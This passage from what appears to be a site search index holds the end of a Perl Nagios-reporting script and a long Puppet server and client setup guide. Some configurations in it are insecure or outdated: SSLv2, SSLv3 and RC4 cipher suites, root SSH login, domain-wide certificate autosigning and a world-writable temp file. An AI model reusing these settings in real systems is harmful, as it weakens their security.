$hostname; $this-\u003e{\"name\"} = $name if defined $name; $this-\u003e{\"duration\"} = $duration if defined $duration; $this-\u003e{\"message\"} = $message if defined $message; $this-\u003e{\"color\"} = $color if defined $color; bless ($this,$classe); #lie la référence à la classe return $this; #on retourne la référence consacrée } sub DESTROY { return 0; } 1; use strict; use Getopt::Long; use LWP::UserAgent; use Mail::Sender; $Mail::Sender::NO_X_MAILER = 1; my @services = (); my $mailbody\t=\t''; my @finalmailbody = ( '' ); my $debug\t=\t0;\t#\tSet the debug level to 1 or higher for information my $webuser\t=\t'';\t#\tSet this to a read-only nagios user (not nagiosadmin!) my $webpass\t=\t'';\t#\tSet this to a read-only nagios user (not nagiosadmin!) my $full; my $reporturl; my @nagiosnames; \u0026GetOptions ( \"debug=s\"\t=\u003e\t\\$debug, \"help\"\t=\u003e\t\\\u0026help, \"email=s\"\t=\u003e\t\\$mailto, \"names=s\"\t=\u003e\t\\@nagiosnames, \"full\"\t=\u003e\t\\$full ); if(!defined($nagiosnames[0])) { @nagiosnames = ('nagios-prod'); } program(@nagiosnames); ################################ FUNCTIONS ####################################### sub program { my @nagiosnames = @_; foreach my $nagiosname (@nagiosnames) { launch(\"$nagiosname\"); main(); check(); } system(\"touch /tmp/nagios-report-htmlout.html; chmod 666 /tmp/nagios-report-htmlout.html\"); push @finalmailbody, ''; sendmail(); system(\"rm /tmp/nagios-report-htmlout.html\"); } sub launch { my $nagiosname = shift; my $title = \"\".uc($nagiosname).\"\n\"; push @finalmailbody, $title; #-- 20110926 - Match the monitoring screen's request #$reporturl = \"http://$nagiosname/cgi-bin/nagios3/status.cgi?host=all\u0026servicestatustypes=28\u0026hoststatustypes=3\u0026serviceprops=42\u0026sorttype=1\u0026sortoption=6\u0026noheader\"; if($nagiosname =~ /internal/) { $reporturl = \"http://$nagiosname/cgi-bin/nagios3/status.cgi?hostgroup=prod-srv\u0026style=detail\u0026servicestatustypes=28\u0026serviceprops=8\u0026sorttype=1\u0026sortoption=6\u0026noheader\"; } else { $reporturl = \"http://$nagiosname/cgi-bin/nagios3/status.cgi?style=detail\u0026servicestatustypes=28\u0026serviceprops=8\u0026sorttype=1\u0026sortoption=6\u0026noheader\"; } # Get all status if ($full) { $reporturl=\"http://$nagiosname/cgi-bin/nagios3/status.cgi?host=all\u0026sorttype=2\u0026sortoption=3\"; } } ############################################################################### sub main { debug(1,\"reporturl: [$reporturl]\"); $mailbody = http_request($reporturl); open(FILE, \"\u003e /tmp/nagios-report-htmlout.html\") or warn \"can't open file /tmp/nagios-report-htmlout.html: $!\\n\"; #print \"DEBUG $mailbody\\n\\n\\n\\n\"; print FILE $mailbody; close FILE; } ############################################################################### sub check { open(FILE, \""
            }
        );
    index.add(
            {
                id:  219 ,
                href: "\/Puppet%C2%A0:%C2%A0Solution_de_gestion_de_fichier_de_configuration\/",
                title: "Puppet: Configuration File Management Solution",
                description: "A comprehensive guide to installing and configuring Puppet, a powerful configuration management tool that helps automate system administration tasks.",
                content: "Introduction linkPuppet is a very practical application… It’s what you would find in companies with large volumes of servers, where the information system is “industrialized”. Puppet allows you to automate many administration tasks, such as software installation, services deployment, or file modifications. Puppet allows you to do this in a centralized way, which helps to better manage and control a large number of heterogeneous or homogeneous servers. Puppet works in Client/Server mode.\nOn each machine, a client will be installed, which will contact the PuppetMaster (the server) through HTTPS communication, and therefore SSL, with a provided PKI system. Puppet was developed in Ruby, making it multi-platform: BSD (free, macOS…), Linux (RedHat, Debian, SUSE…), Sun (OpenSolaris…) Reductive Labs, the company publishing Puppet, has developed a complementary product called Facter. This application lists specific elements of the managed systems, such as hostname, IP address, distribution, and environment variables that can be used in Puppet templates. As Puppet manages templates, you can quickly understand the usefulness of Facter. For example, if you manage a farm of mail servers that require configuration containing the machine name, a template combined with environment variables proves quite useful. In short, Puppet combined with Facter seems like a very interesting solution to simplify system administration.\nHere is a diagram showing how Puppet works: For Puppet configuration, if you want to use an IDE, there is Geppetto. I recommend it, as it will save you a lot of syntax troubles.\nDocumentation for previous versions is available here:\nPuppet 2.7 Puppet 0.25.4 Puppet Hierarchy linkBefore going further, I’ve borrowed from the official site how the Puppet directory structure works:\nAll Puppet data files (modules, manifests, distributable files, etc) should be maintained in a Subversion or CVS repository (or your favorite Version Control System). The following hierarchy describes the layout one should use to arrange the files in a maintainable fashion:\n/manifests/: this directory contains files and subdirectories that determine the manifest of individual systems but do not logically belong to any particular module. Generally, this directory is fairly thin and alternatives such as the use of LDAP or other external node tools can make the directory even thinner. This directory contains the following special files: site.pp: first file that the Puppet Master parses when determining a server’s catalog. It imports all the underlying subdirectories and the other special files in this directory. It also defines any global defaults, such as package managers. See sample site.pp. templates.pp: defines all template classes. See also terminology:template classes. See sample templates.pp. nodes.pp: defines all the nodes if not using an external node tool. See sample nodes.pp. /modules/{modulename}/: houses puppet modules in subdirectories with names matching that of the module name. This area defines the general building blocks of a server and contains modules such as for openssh, which will generally define classes openssh::client and openssh::server to setup the client and server respectively. The individual module directories contains subdirectories for manifests, distributable files, and templates. See modules organization, terminology:module. /modules/user/: A special module that contains manifests for users. This module contains a special subclass called user::virtual which declares all the users that might be on a given system in a virtual way. The other subclasses in the user module are classes for logical groupings, such as user::unixadmins, which will realize the individual users to be included in that group. See also naming conventions, terminology:realize. /services/: this is an additional modules area that is specified in the module path for the puppetmaster. However, instead of generic modules for individual services and bits of a server, this module area is used to model servers specific to enterprise level infrastructure services (core infrastructure services that your IT department provides, such as www, enterprise directory, file server, etc). Generally, these classes will include the modules out of /modules/ needed as part of the catalog (such as openssh::server, postfix, user::unixadmins, etc). The files section for these modules is used to distribute configuration files specific to the enterprise infrastructure service such as openldap schema files if the module were for the enterprise directory. To avoid namespace collision with the general modules, it is recommended that these modules/classes are prefixed with s_ (e.g. s_ldap for the enterprise directory server module) /clients/: similar to the /services/ module area, this area is used for modules related to modeling servers for external clients (departments outside your IT department). To avoid namespace collision, it is recommended that these modules/classes are prefixed with c_. /notes/: this directory contains notes for reference by local administrators. /plugins/: contains custom types programmed in Ruby. See also terminology:plugin-type. /tools/: contains scripts useful to the maintenance of Puppet. Installation linkPuppet Server linkThe master version used must be the same as that of the client machines. It is highly recommended to use a version greater than or equal to 0.25.4 (which fixes numerous performance issues). For this, on Debian, you’ll need to install the version available in squeeze/lenny-backport or higher, and lock it to prevent an accidental upgrade from changing its version (use “pin locks”). Here we will opt for the version given on the official Puppet site.\nFor now, we need to configure the /etc/hosts file with the server IP:\n... 192.168.0.93 puppet-prd.deimos.fr puppet ... Note: Check that the puppetmaster’s clock (and client clocks as well) is up-to-date/synchronized. There can be an issue with certificates not being recognized/accepted if there is a time discrepancy (run dpkg-reconfigure tz-data).\nConfigure the official Puppet repository if you want the latest version, otherwise skip this step to install the version provided by your distribution:\nwget http://apt.puppetlabs.com/puppetlabs-release-stable.deb dpkg -i puppetlabs-release-stable.deb And then update:\naptitude update Then install puppetmaster:\naptitude install puppetmaster You can verify that puppetmaster is installed correctly by running ‘facter’ (see if it returns something) or checking for SSL files (in /var/lib/puppet).\nWeb Server linkNow we need to configure a web server on the same machine as the Puppet server (Puppet Master). Why? Simply because the default server is Webrick and it collapses if 10 nodes access it simultaneously.\nwarning You can keep Webrick if you want to test on a few nodes, but not for production! The choice is yours between Passenger and Nginx. Passenger is the recommended solution since Puppet 3.\nPassenger linkIf you’ve chosen to use Passenger as recommended by PuppetLab, you need to disable automatic daemon startup, as it would start a web server and conflict with Passenger:\n# Defaults for puppetmaster - sourced by /etc/init.d/puppetmaster # Start puppetmaster on boot? If you are using passenger, you should # have this set to \"no\" START=no # Startup options DAEMON_OPTS=\"\" # What port should the puppetmaster listen on (default: 8140). PORT=8140 Now disable the service:\n/etc/init.d/puppetmaster stop Then, install Passenger:\naptitude install puppetmaster-passenger You don’t need to do any configuration. Everything is provided by the official Puppet packages. In case you installed it without the official repository, here is the generated configuration:\n# you probably want to tune these settings PassengerHighPerformance on PassengerMaxPoolSize 12 PassengerPoolIdleTime 1500 # PassengerMaxRequests 1000 PassengerStatThrottleRate 120 RackAutoDetect Off RailsAutoDetect Off Listen 8140 SSLEngine on SSLProtocol -ALL +SSLv3 +TLSv1 SSLCipherSuite ALL:!ADH:RC4+RSA:+HIGH:+MEDIUM:-LOW:-SSLv2:-EXP SSLCertificateFile /var/lib/puppet/ssl/certs/puppet.deimos.lan.pem SSLCertificateKeyFile /var/lib/puppet/ssl/private_keys/puppet.deimos.lan.pem SSLCertificateChainFile /var/lib/puppet/ssl/certs/ca.pem SSLCACertificateFile /var/lib/puppet/ssl/certs/ca.pem # If Apache complains about invalid signatures on the CRL, you can try disabling # CRL checking by commenting the next line, but this is not recommended. SSLCARevocationFile /var/lib/puppet/ssl/ca/ca_crl.pem SSLVerifyClient optional SSLVerifyDepth 1 # The `ExportCertData` option is needed for agent certificate expiration warnings SSLOptions +StdEnvVars +ExportCertData # This header needs to be set if using a loadbalancer or proxy RequestHeader unset X-Forwarded-For RequestHeader set X-SSL-Subject %{SSL_CLIENT_S_DN}e RequestHeader set X-Client-DN %{SSL_CLIENT_S_DN}e RequestHeader set X-Client-Verify %{SSL_CLIENT_VERIFY}e DocumentRoot /usr/share/puppet/rack/puppetmasterd/public/ RackBaseURI / Options None AllowOverride None Order allow,deny allow from all NGINX and Mongrel linkInstallation linkIf you’ve chosen NGINX and Mongrel, you’ll need to start by installing them:\naptitude install nginx mongrel Configuration linkModify the /etc/default/puppetmaster file:\n# Defaults for puppetmaster - sourced by /etc/init.d/puppet # Start puppet on boot? START=yes # Startup options DAEMON_OPTS=\"\" # What server type to run # Options: # webrick (default, cannot handle more than ~30 nodes) # mongrel (scales better than webrick because you can run # multiple processes if you are getting # connection-reset or End-of-file errors, switch to # mongrel. Requires front-end web-proxy such as # apache, nginx, or pound) # See: http://reductivelabs.com/trac/puppet/wiki/UsingMongrel SERVERTYPE=mongrel # How many puppetmaster instances to start? Its pointless to set this # higher than 1 if you are not using mongrel. PUPPETMASTERS=4 # What port should the puppetmaster listen on (default: 8140). If # PUPPETMASTERS is set to a number greater than 1, then the port for # the first puppetmaster will be set to the port listed below, and # further instances will be incremented by one # # NOTE: if you are using mongrel, then you will need to have a # front-end web-proxy (such as apache, nginx, pound) that takes # incoming requests on the port your clients are connecting to # (default is: 8140), and then passes them off to the mongrel # processes. In this case it is recommended to run your web-proxy on # port 8140 and change the below number to something else, such as # 18140. PORT=18140 After (re-)starting the daemon, you should be able to see the attached sockets:\n\u003e netstat -pvltpn Connexions Internet actives (seulement serveurs) Proto Recv-Q Send-Q Adresse locale Adresse distante Etat PID/Program name tcp 0 0 0.0.0.0:41736 0.0.0.0:* LISTEN 2029/rpc.statd tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 2018/portmap tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2333/sshd tcp 0 0 127.0.0.1:18140 0.0.0.0:* LISTEN 10059/ruby tcp 0 0 127.0.0.1:18141 0.0.0.0:* LISTEN 10082/ruby tcp 0 0 127.0.0.1:18142 0.0.0.0:* LISTEN 10104/ruby tcp 0 0 127.0.0.1:18143 0.0.0.0:* LISTEN 10126/ruby tcp6 0 0 :::22 :::* LISTEN 2333/sshd Add the following lines to the /etc/puppet/puppet.conf file:\n[main] logdir=/var/log/puppet vardir=/var/lib/puppet ssldir=/var/lib/puppet/ssl rundir=/var/run/puppet factpath=$vardir/lib/facter templatedir=$confdir/templates pluginsync = true [master] # These are needed when the puppetmaster is run by passenger # and can safely be removed if webrick is used. ssl_client_header = HTTP_X_SSL_SUBJECT ssl_client_verify_header = SSL_CLIENT_VERIFY report = true [agent] server=puppet-srv.deimos.fr Modify the following configuration in /etc/nginx.conf:\nuser www-data; worker_processes 4; error_log /var/log/nginx/error.log; pid /var/run/nginx.pid; events { worker_connections 1024; # multi_accept on; } http { #include /etc/nginx/mime.types; default_type application/octet-stream; access_log /var/log/nginx/access.log; sendfile on; tcp_nopush on; # Look at TLB size in /proc/cpuinfo (Linux) for the 4k pagesize large_client_header_buffers 16 4k; proxy_buffers 128 4k; #keepalive_timeout 0; keepalive_timeout 65; tcp_nodelay on; gzip on; gzip_disable \"MSIE [1-6]\\.(?!.*SV1)\"; include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } And add this configuration for puppet:\nupstream puppet-prd.deimos.fr { server 127.0.0.1:18140; server 127.0.0.1:18141; server 127.0.0.1:18142; server 127.0.0.1:18143; } server { listen 8140; ssl on; ssl_certificate /var/lib/puppet/ssl/certs/puppet-prd.pem; ssl_certificate_key /var/lib/puppet/ssl/private_keys/puppet-prd.pem; ssl_client_certificate /var/lib/puppet/ssl/ca/ca_crt.pem; ssl_ciphers SSLv2:-LOW:-EXPORT:RC4+RSA; ssl_session_cache shared:SSL:8m; ssl_session_timeout 5m; ssl_verify_client optional; # obey to the Puppet CRL ssl_crl /var/lib/puppet/ssl/ca/ca_crl.pem; root /var/empty; access_log /var/log/nginx/access-8140.log; #rewrite_log /var/log/nginx/rewrite-8140.log; # Variables # $ssl_cipher returns the line of those utilized it is cipher for established SSL-connection # $ssl_client_serial returns the series number of client certificate for established SSL-connection # $ssl_client_s_dn returns line subject DN of client certificate for established SSL-connection # $ssl_client_i_dn returns line issuer DN of client certificate for established SSL-connection # $ssl_protocol returns the protocol of established SSL-connection location / { proxy_pass http://puppet-prd.deimos.fr; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Client_DN $ssl_client_s_dn; proxy_set_header X-Client-Verify $ssl_client_verify; proxy_set_header X-SSL-Subject $ssl_client_s_dn; proxy_set_header X-SSL-Issuer $ssl_client_i_dn; proxy_read_timeout 65; } } Then create the symbolic link to apply the configuration:\ncd /etc/nginx/sites-available ln -s /etc/nginx/sites-enabled/puppetmaster . And then restart the Nginx server.\nTo verify that the daemons are running correctly, you should have the following sockets open:\n\u003e netstat -vlptn Connexions Internet actives (seulement serveurs) Proto Recv-Q Send-Q Adresse locale Adresse distante Etat PID/Program name tcp 0 0 0.0.0.0:41736 0.0.0.0:* LISTEN 2029/rpc.statd tcp 0 0 0.0.0.0:8140 0.0.0.0:* LISTEN 10293/nginx tcp 0 0 0.0.0.0:8141 0.0.0.0:* LISTEN 10293/nginx tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 2018/portmap tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2333/sshd tcp 0 0 127.0.0.1:18140 0.0.0.0:* LISTEN 10059/ruby tcp 0 0 127.0.0.1:18141 0.0.0.0:* LISTEN 10082/ruby tcp 0 0 127.0.0.1:18142 0.0.0.0:* LISTEN 10104/ruby tcp 0 0 127.0.0.1:18143 0.0.0.0:* LISTEN 10126/ruby tcp6 0 0 :::22 :::* LISTEN 2333/sshd Puppet Clients linkFor clients, it’s also simple. But first add the server line to the hosts file:\n... 192.168.0.93 puppet-prd.deimos.fr puppet This is not mandatory if your DNS names are correctly configured.\nDebian linkIf you want to use the latest version:\nwget http://apt.puppetlabs.com/puppetlabs-release-stable.deb dpkg -i puppetlabs-release-stable.deb And then update:\naptitude update Verify that the /etc/hosts file contains the hostname of the client machine, then install puppet:\naptitude install puppet Red Hat linkJust like Debian, there is a yum repo on Red Hat and we’ll install a package that will configure it for us:\nrpm -ivh http://yum.puppetlabs.com/el/6/products/x86_64/puppetlabs-release-6-6.noarch.rpm Then install:\nyum install puppet Solaris linkThe stable Puppet client in blastwave is too old (0.23). Therefore, Puppet (and Facter) will need to be installed through Ruby’s standard manager: gem. To do this, you’ll first need to install ruby with the following command:\npkg-get -i ruby warning Check that rubygems is not already installed, otherwise remove it:\\n\\nbash\\npkg-get -r rubygems\\n Then install a more up-to-date version from the sources:\nwget http://rubyforge.org/frs/download.php/45905/rubygems-1.3.1.tgz gzcat rubygems-1.3.1.tgz | tar -xf - cd rubygems-1.3.1 ruby setup.rb gem --version Install puppet with the command and the -p argument if you have a proxy:\ngem install puppet --version '0.25.4' -p http://proxy:3128/ You need to modify/add some commands that are not available by default on Solaris for Puppet to work better:\nCreate a link for uname and puppetd: ln -s /usr/bin/uname /usr/bin/ ln -s /opt/csw/bin/puppetd /usr/bin/ Create a script called /usr/bin/dnsdomainname: #!/usr/bin/bash DOMAIN=\"`/usr/bin/domainname 2\u003e /dev/null`\" if [ ! -z \"$DOMAIN\" ]; then echo $DOMAIN | sed 's/^[^.]*.//' fi chmod 755 /usr/bin/dnsdomainname Then, the procedure is the same as for other OSes, that is, modify /etc/hosts to include puppet-prd.deimos.fr, and run:\npuppetd --verbose --no-daemon --test --server puppet-prd.deimos.fr At this point, if it doesn’t work, it’s simply because you need to modify the configuration (puppet.conf) of your client.\nConfiguration linkServer linkFor the server part, here’s how the directory structure is organized (in /etc/puppet):\n. |-- auth.conf |-- autosign.conf |-- fileserver.conf |-- manifests | |-- common.pp | |-- modules.pp | `-- site.pp |-- modules |-- puppet.conf `-- templates auth.conf linkThis is where we set all the permissions:\n# This is an example auth.conf file, it mimics the puppetmasterd defaults # # The ACL are checked in order of appearance in this file. # # Supported syntax: # This file supports two different syntax depending on how # you want to express the ACL. # # Path syntax (the one used below): # --------------------------------- # path /path/to/resource # [environment envlist] # [method methodlist] # [auth[enthicated] {yes|no|on|off|any}] # allow [host|ip|*] # deny [host|ip] # # The path is matched as a prefix. That is /file match at # the same time /file_metadat and /file_content. # # Regex syntax: # ------------- # This one is differenciated from the path one by a '~' # # path ~ regex # [environment envlist] # [method methodlist] # [auth[enthicated] {yes|no|on|off|any}] # allow [host|ip|*] # deny [host|ip] # # The regex syntax is the same as ruby ones. # # Ex: # path ~ .pp$ # will match every resource ending in .pp (manifests files for instance) # # path ~ ^/path/to/resource # is essentially equivalent to path /path/to/resource # # environment:: restrict an ACL to a specific set of environments # method:: restrict an ACL to a specific set of methods # auth:: restrict an ACL to an authenticated or unauthenticated request # the default when unspecified is to restrict the ACL to authenticated requests # (ie exactly as if auth yes was present). # ### Authenticated ACL - those applies only when the client ### has a valid certificate and is thus authenticated # allow nodes to retrieve their own catalog (ie their configuration) path ~ ^/catalog/([^/]+)$ method find allow $1 # allow nodes to retrieve their own node definition path ~ ^/node/([^/]+)$ method find allow $1 # allow all nodes to access the certificates services path /certificate_revocation_list/ca method find allow * # allow all nodes to store their reports path /report method save allow * # inconditionnally allow access to all files services # which means in practice that fileserver.conf will # still be used path /file allow * ### Unauthenticated ACL, for clients for which the current master doesn't ### have a valid certificate; we allow authenticated users, too, because ### there isn't a great harm in letting that request through. # allow access to the master CA path /certificate/ca method find allow * path /certificate/ method find allow * path /certificate_request method find, save allow * # this one is not stricly necessary, but it has the merit # to show the default policy which is deny everything else path / auth any allow *.deimos.fr In case you encounter access problems, for insecure but simple testing, add this line at the end of your configuration file:\nallow * autosign.conf linkYou can auto-sign certain certificates to save time. This can be a bit dangerous, but if your node filtering is done correctly behind, no worries :-)\n*.deimos.fr Here I’ll auto-sign all my nodes with the deimos.fr domain.\nfileserver.conf linkGive permissions for client machines in the /etc/puppet/fileserver.conf file:\n# This file consists of arbitrarily named sections/modules # defining where files are served from and to whom # Define a section 'files' # Adapt the allow/deny settings to your needs. Order # for allow/deny does not matter, allow always takes precedence # over deny [files] path /etc/puppet/files allow *.deimos.fr # allow *.example.com # deny *.evil.example.com # allow 192.168.0.0/24 [plugins] allow *.deimos.fr # allow *.example.com # deny *.evil.example.com # allow 192.168.0.0/24 manifests linkLet’s create the missing files:\ntouch /etc/puppet/manifests/{common.pp,modules.pp,site.pp} common.pp linkThe common.pp is empty, but you can insert things that will be taken as global configuration.\nmodules.pp linkThen I’ll define my base module(s) here. For example, in my future configuration I’ll declare a “base” module that will contain everything that any machine that’s part of puppet will inherit:\nimport \"base\" site.pp linkWe ask to load all modules present in the modules folder:\n# /etc/puppet/manifests/site.pp import \"common.pp\" # The filebucket option allows for file backups to the server filebucket { main: server =\u003e 'puppet-prod-nux.deimos.fr' } # Backing up all files and ignore vcs files/folders File { backup =\u003e '.puppet-bak', ignore =\u003e ['.svn', '.git', 'CVS' ] } # Default global path Exec { path =\u003e \"/usr/bin:/usr/sbin/:/bin:/sbin\" } # Import base module import \"modules.pp\" Here I tell it to use the filebucket on the puppet server and to rename files that will be replaced by puppet to .puppet-bak. I also ask it to ignore any directories or files created by VCS like SVN, Git or CVS. And finally, I indicate the default path that puppet will have when it runs on clients.\nAll this configuration is specific to the puppet server, so it’s global. Anything we put in it can be inherited. Restart the puppetmaster to make sure that the server-side changes have been properly taken into account.\npuppet.conf linkI intentionally skipped the modules folder as it’s the big piece of puppet and will be given special attention later in this article.\nSo we’re going to move on to the puppet.conf configuration file that you probably already configured during the mongrel/nginx installation…:\n[main] logdir=/var/log/puppet vardir=/var/lib/puppet ssldir=/var/lib/puppet/ssl rundir=/var/run/puppet factpath=$vardir/lib/facter templatedir=$confdir/templates pluginsync = true [master] # These are needed when the puppetmaster is run by passenger # and can safely be removed if webrick is used. ssl_client_header = HTTP_X_SSL_SUBJECT ssl_client_verify_header = SSL_CLIENT_VERIFY report = true [agent] server=puppet-srv.deimos.fr For the templates folder, I have nothing in it.\nClient linkEach client must have its entry in the DNS server (just like the server)!\npuppet.conf linkDebian / Red Hat linkThe configuration file must contain the server address:\n[main] # The Puppet log directory. # The default value is '$vardir/log'. logdir = /var/log/puppet # Where Puppet PID files are kept. # The default value is '$vardir/run'. rundir = /var/run/puppet # Where SSL certificates are kept. # The default value is '$confdir/ssl'. ssldir = $vardir/ssl # Puppet master server server = puppet-prd.deimos.fr # Add custom facts pluginsync = true pluginsource = puppet://$server/plugins factpath = /var/lib/puppet/lib/facter [agent] # The file in which puppetd stores a list of the classes # associated with the retrieved configuratiion. Can be loaded in # the separate ``puppet`` executable using the ``--loadclasses`` # option. # The default value is '$confdir/classes.txt'. classfile = $vardir/classes.txt # Where puppetd caches the local configuration. An # extension indicating the cache format is added automatically. # The default value is '$confdir/localconfig'. localconfig = $vardir/localconfig # Reporting report = true Solaris linkFor Solaris, the configuration needed quite a bit of adaptation:\n[main] logdir=/var/log/puppet vardir=/var/opt/csw/puppet rundir=/var/run/puppet # ssldir=/var/lib/puppet/ssl ssldir=/etc/puppet/ssl # Where 3rd party plugins and modules are installed libdir = $vardir/lib templatedir=$vardir/templates # Turn plug-in synchronization on. pluginsync = true pluginsource = puppet://$server/plugins factpath = /var/puppet/lib/facter [puppetd] report=true server=puppet-prd.deimos.fr # certname=puppet-prd.deimos.fr # enable the marshal config format config_format=marshal # different run-interval, default= 30min # e.g. run puppetd every 4 hours = 14400 runinterval = 14400 logdest=/var/log/puppet/puppet.log The Language linkBefore starting to create modules, we need to know a bit more about the syntax/language used for puppet. Its syntax is close to ruby and it’s even possible to write complete modules in ruby. I’ll explain here some techniques/possibilities to allow you to create advanced modules later.\nWe’ll also use types, I won’t go into detail on these, because the doc on the site is clear enough: http://docs.puppetlabs.com/references/latest/type.html\nFunctions linkHere’s how to define a function with multiple arguments:\ndefine network_config( $ip, $netmask, $gateway ) { notify {\"$ip, $netmask, $gateway\":} } network_config { \"eth0\": ip =\u003e '192.168.0.1', netmask =\u003e '255.255.255.0', gateway =\u003e '192.168.0.254, } Installing packages linkWe’ll see here how to install a package, then use a function to easily install many more. For a single package, it’s simple:\n# Install kexec-tools package { 'kexec-tools': ensure =\u003e 'installed' } Here we’re asking for a package (kexec-tool) to be installed. If we want several to be installed, we’ll need to create an array:\n# Install kexec-tools package { [ 'kexec-tools', 'package2', 'pacakge3' ]: ensure =\u003e 'installed' } This is quite practical and arrays often work this way for pretty much any type used. We can also create a function for this in which we’ll send each element of the array:\n# Validate that pacakges are installed define packages_install () { notice(\"Installation of ${name} package\") package { \"${name}\": ensure =\u003e 'installed' } } # Set all custom packages (not embended in distribution) that need to be installed packages_install { [ 'puppet', 'tmux' ]: } Some of you will say that for this specific case, it’s pointless, since the method above allows it to be done while others will find this method more elegant and easier to comprehend for a novice coming to puppet. The function name used is packages_install, the $name variable is always the first element sent to a function, which corresponds here to each element in our array.\nIncluding / Excluding modules linkYou’ve just seen functions, we’ll push them a bit further with a solution to include and exclude the loading of certain modules. Here, I have a functions file:\n# Load or not modules (include/exclude) define include_modules () { if ($exclude_modules == undef) or !($name in $exclude_modules) { include $name } } Here I have another file representing the roles of my servers (we’ll get to that later):\n# Load modules $minimal_modules = [ 'puppet', 'resolvconf', 'packages_defaults', 'configurations_defaults' ] include_modules{ $minimal_modules: } And finally a file containing the name of a server in which I’m going to ask it to load certain modules, but also exclude some:\nnode 'srv.deimos.fr' { $exclude_modules = [ 'resolvconf' ] include base::minimal } Here I use an array ‘$exclude_modules’ (with a single element, but you can add several separated by commas), which will allow me to specify which modules to exclude. Because by the next line it will load everything it will need through the include_modules function.\nTemplates linkWhen you write manifests, you call a directive named ‘File’ when you want to send a file to a server. But if the content of that file needs to change based on certain parameters (name, ip, timezone, domain…), then you need to use templates! And that’s where it gets interesting as it’s possible to script within a template to generate its content. Templates use a language very close to ruby.\nIn a template, the following syntax is used:\nFor facts, it’s simple, you need to prefix the variable with a “@”. For example \u003c%= fqdn %\u003e becomes \u003c%= @fqdn %\u003e. For your variables, if it’s declared in the manifest that calls the template, also use “@”. My variable myvar defined in the manifest that calls this template has the value \u003c%= myvar %\u003e. If you want to access a variable defined outside the current manifest, outside the local scope, use the scope.lookupvar function:\n\u003c%= scope.lookupvar('common::config::myvar') %\u003e You can validate your template via:\nerb -P -x -T '-' mytemplate.erb | ruby -c Here’s an example with OpenSSH so you understand. I’ve taken the configuration that will vary according to certain parameters:\n# Package generated configuration file # See the sshd(8) manpage for details # What ports, IPs and protocols we listen for \u003c% ssh_default_port.each do |val| -%\u003e Port \u003c%= val -%\u003e \u003c% end -%\u003e # Use these options to restrict which interfaces/protocols sshd will bind to #ListenAddress :: #ListenAddress 0.0.0.0 Protocol 2 # HostKeys for protocol version 2 HostKey /etc/ssh/ssh_host_rsa_key HostKey /etc/ssh/ssh_host_dsa_key #Privilege Separation is turned on for security UsePrivilegeSeparation yes # Lifetime and size of ephemeral version 1 server key KeyRegenerationInterval 3600 ServerKeyBits 768 # Logging SyslogFacility AUTH LogLevel INFO # Authentication: LoginGraceTime 120 PermitRootLogin yes StrictModes yes RSAAuthentication yes PubkeyAuthentication yes #AuthorizedKeysFile %h/.ssh/authorized_keys # Don't read the user's ~/.rhosts and ~/.shosts files IgnoreRhosts yes # For this to work you will also need host keys in /etc/ssh_known_hosts RhostsRSAAuthentication no # similar for protocol version 2 HostbasedAuthentication no # Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication #IgnoreUserKnownHosts yes # To enable empty passwords, change to yes (NOT RECOMMENDED) PermitEmptyPasswords no # Change to yes to enable challenge-response passwords (beware issues with # some PAM modules and threads) ChallengeResponseAuthentication no # Change to no to disable tunnelled clear text passwords #PasswordAuthentication yes # Kerberos options #KerberosAuthentication no #KerberosGetAFSToken no #KerberosOrLocalPasswd yes #KerberosTicketCleanup yes # GSSAPI options #GSSAPIAuthentication no #GSSAPICleanupCredentials yes X11Forwarding yes X11DisplayOffset 10 PrintMotd no PrintLastLog yes TCPKeepAlive yes #UseLogin no #MaxStartups 10:30:60 #Banner /etc/issue.net # Allow client to pass locale environment variables AcceptEnv LANG LC_* Subsystem sftp /usr/lib/openssh/sftp-server UsePAM yes # AllowUsers \u003c%= ssh_allowed_users %\u003e Here we’re using two types of template usage. A multi-line repetition, and the other with a simple variable replacement:\nssh_default_port.each do: allows us to put a line of “Port num_port” for each specified port ssh_allowed_users: allows us to give a list of users These variables are usually declared either in the node part or in the global configuration. We’ve just seen how to put a variable or a loop in a template, but know that it’s also possible to use if statements! In short, a complete language exists and allows you to modulate a file as you wish.\nThese methods prove simple and very effective. Small subtlety:\n-%\u003e: When a line ends like this, there won’t be a line break thanks to the - at the end. %\u003e: There will be a line break here. Inline-templates linkThis is a small subtlety that may seem unnecessary, but is actually very useful for executing small methods within a manifest! Take for example the ‘split’ function that exists in puppet today, it would seem normal that the ‘join’ function exists, right? Well, no… at least not in the current version at the time of writing this (2.7.18). So I can use in the same way as templates code in my manifests, see for yourself:\n$ldap_servers = [ '192.168.0.1', '192.168.0.2', '127.0.0.1' ] $comma_ldap_servers = inline_template(\"\u003c%= (ldap_servers).join(',') %\u003e\") $ldap_servers: this is a simple array with my list of LDAP servers $comma_ldap_servers: we use the inline_template function, which will call the join function, pass it the ldap_servers array and join the content with commas. I would finally have:\n$comma_ldap_servers = '192.168.0.1,192.168.0.2,127.0.0.1' Facters link“Facts” are scripts (see /usr/lib/ruby/1.8/facter for standard facts) that allow building dynamic variables, which change depending on the environment in which they are executed. For example, we could define a “fact” that determines if we are on a “cluster” type machine based on the presence or absence of a file:\n# is_cluster.rb Facter.add(\"is_cluster\") do setcode do FileTest.exists?(\"/etc/cluster/nodeid\") end end You can also use functions that allow you to directly use facter-type functions in templates (downcase or upcase to change case):\n# # Config file for collectd(1). # Please read collectd.conf(5) for a list of options. # http://collectd.org/ # Hostname \u003c%= hostname.downcase %\u003e FQDNLookup true Be careful, if you want to test the fact on the destination machine, don’t forget to specify the path where the facts are located on the machine:\nexport FACTERLIB=/var/lib/puppet/lib/facter or for Solaris:\nexport FACTERLIB=/var/opt/csw/puppet/lib/facter To see the list of facts currently on the system, simply type the facter command:\n\u003e facter facterversion =\u003e 1.5.7 hardwareisa =\u003e i386 hardwaremodel =\u003e i86pc hostname =\u003e PA-OFC-SRV-UAT-2 hostnameldap =\u003e PA-OFC-SRV-UAT id =\u003e root interfaces =\u003e lo0,e1000g0,e1000g0_1,e1000g0_2,e1000g1,e1000g2,e1000g3,clprivnet0 ... See http://docs.puppetlabs.com/guides/custom_facts.html for more 